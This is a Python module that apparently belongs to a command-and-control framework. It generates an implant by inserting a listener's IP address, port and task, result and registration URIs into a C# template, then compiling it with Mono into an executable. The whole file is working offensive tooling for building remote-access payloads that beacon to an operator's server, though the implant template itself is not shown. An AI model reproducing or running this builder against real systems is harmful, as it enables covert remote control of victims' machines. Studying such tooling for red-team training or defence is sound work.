from shutil import copyfile

from common import *
from listenershelpers import listeners, isValidListener, checkListenersEmpty

import subprocess

Payloads = {
    "exe[x32/x64]" : "Coded in C#, compiled with Mono"
}

vPayloads = [payload for payload in Payloads]
vArchs    = ["x64"]

def isValidPayload(name, s):

    if name in vPayloads:
        return True
    else:
        if s == 1:
            error("Invalid payload type.")
            return False
        else:
            return False

def isValidArch(arch, s):

    if arch in vArchs:
        return True
    else:
        if s == 1:
            error("Invalid architecture.")
            return False
        else:
            return False

def viewPayloads():

    success("Available payload types: ")

    print(YELLOW)
    print(" Type                         Description")
    print("------                       -------------")
    
    for i in Payloads:
        print(" {}".format(i) + " " * (29 - len(i)) + "{}".format(Payloads[i]))
    
    print(cRESET)

def mono_msc(listener):
    
    temp_file = "./lib/templates/Implant.cs"
    outpath   = "./lib/templates/temp.cs"
    ip        = listeners[listener].ipaddress
    port      = listeners[listener].port
    uReg      = listeners[listener].uri_reg
    uTasks    = listeners[listener].uri_tasks
    uResults  = listeners[listener].uri_results
    

    with open(temp_file, "rt") as p:
        payload = p.read()

    payload = payload.replace('§IP§',ip)
    payload = payload.replace('§PORT§',str(port))
    payload = payload.replace('§URIG§',uReg)
    payload = payload.replace('§URIS§',uResults)
    payload = payload.replace('§URIT§',uTasks)

    with open(outpath, "wt") as f:
        f.write(payload)
   
    out = subprocess.call(["mcs", outpath, "-r:System.Net.Http", "-sdk:4.8"])
    if out == 0:
        success("File generated in: {}".format(outpath.replace('.cs','.exe')))
   
    

def generatePayload(args):
    
    if len(args) != 1:
        error("Invalid arguments.")
        return 0
    else:
        # at the moment there is only on payload
        Type       = "exe[x64]"
        arch       = "x64"
        listener   = args[0]
        #outputname = args[1]
        
        #if isValidPayload(Type, 1) == False:
         #   return 0
        
        if checkListenersEmpty(1) == True:
            return 0

        if isValidListener(listener, 1) == False:
            return 0
        
        #if isValidArch(arch, 1) == False:
            #return 0
        
        
        mono_msc(listener)
